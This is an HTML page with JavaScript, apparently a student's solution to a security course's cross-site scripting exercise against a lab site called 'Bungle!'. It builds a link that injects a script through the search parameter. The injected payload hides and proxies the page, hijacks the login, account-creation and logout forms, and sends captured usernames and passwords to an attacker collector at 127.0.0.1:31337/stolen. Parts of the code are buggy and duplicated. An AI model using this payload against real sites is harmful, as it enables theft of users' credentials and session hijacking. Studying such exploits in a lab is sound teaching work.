<meta charset="utf-8">
<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script>

// Extend this function:
function payload(attacker) {
	function log(data) {
		console.log($.param(data))
		$.get(attacker, data);
	}
	// AW: helper function for the login form submission and account creation
	// param: the_event - type=string; either "login" or "create"
	function post_helper(the_event){
		var uname = document.getElementById("username").value;
		var pword = document.getElementById("userpass").value;
		$.post("http://permalink.co/" + the_event, {username: uname, password: pword}, function(){
			log({event: the_event, user: uname, pass: pword});
			proxy("http://permalink.co/");
		});
	}
	function proxy(href) {
		$("html").load(href, function(){
			$("html").show();
			log({event: "nav", uri: href});
			$("#query").val("pwned!");

/*
			window.addEventListener("popstate", function(e) {
				proxy(history.)
			});
*/

			var stateObj = {
			    foo: "bar"
			};
			history.pushState(proxy(href), "", href);
			

			// Bungle! link
			$('#bungle-lnk').on("click", function(event) {
				event.preventDefault();
				proxy("http://permalink.co/");
				alert("Bungle_link_alert");
			});	

			// Search
			$('form[action="./search"]').on("submit", function(event) {
				usersSearch = document.getElementById('query').value;
				event.preventDefault();
				var target_link = "http://permalink.co/search?q=" + usersSearch;
				proxy(target_link);
				alert("Search_form_alert");
			});

			// Search again
			$('#search-again-btn').on("click", function(event) {
				event.preventDefault();
				proxy("http://permalink.co/");
				alert("Search_Again_button_alert");
			});

			// login
			$('form[action="./login"]').on("submit", function(event) {
				event.preventDefault();
				post_helper("login");
				alert("login_form_alert");

			});

			// create account
			$('#new-account-btn').on("click", function(event) {
				event.preventDefault();
				post_helper("create");
				alert("create_account_alert");
			});


			// logout
			$('#log-out-btn').on("click", function(event) {
				event.preventDefault();
				var uname = document.getElementById("logged-in-user").value;
				$.post("http://permalink.co/logout", function(){
					log({event: "logout", user: uname});
					proxy("http://permalink.co/");
				});
			});


		});

		
	}
	$("html").hide();
	proxy("./");
}

// AW: helper function for the login form submission and account creation
// param: the_event - type=string; either "login" or "create"
function post_helper(the_event){
	var uname = document.getElementById("username").value;
	var pword = document.getElementById("userpass").value;
	event.preventDefault();
	$.post("http://permalink.co/" + the_event, {username: uname, password: pword}, function(){
		log({event: the_event, user: uname, pass: pword});
		proxy("http://permalink.co/");
	});
}

// make the url; the url embeds the function definition above by calling payload.toString()
function makeLink(xssdefense, target, attacker) {
	if (xssdefense == 0) {
		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
			encodeURIComponent("<script" + ">" + payload.toString() + ";payload(\"" + attacker + "\");</script" + ">");
	} else {
	// Implement code to defeat XSS defenses here.
	}
}

var xssdefense = 0;
var target = "http://permalink.co/";
var attacker = "http://127.0.0.1:31337/stolen";

// This part makes the <a></a> html code for the Try Bungle link
$(function() {
	var url = makeLink(xssdefense, target, attacker);
	$("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
});

</script>
<h3></h3>